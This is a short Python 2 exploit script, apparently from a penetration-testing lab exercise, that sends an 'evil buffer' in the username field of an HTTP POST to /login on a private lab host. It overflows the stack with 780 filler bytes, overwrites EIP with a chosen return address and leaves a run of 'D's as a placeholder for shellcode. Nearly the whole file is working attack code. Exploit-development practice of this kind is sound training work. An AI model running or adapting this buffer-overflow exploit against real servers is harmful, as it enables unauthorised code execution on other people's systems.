#!/usr/bin/env python
#
# The eip value is in the reverse order because it is in endian byte order
# Running this will stop the app at the breakpoint. Press F7 to single step into the shellcode placeholder which is all D's in this case.
#
import socket
import sys


try:
    print "\nSending evil buffer..."

    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

 
    inputBuffer = filler + eip + offset + buffer
    
    content = "username=" + inputBuffer+ "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.172.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.172.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.172.10", 80))
    s.send(buffer)

    s.close
    print "\nDone"
except:
    print "\nError connection"
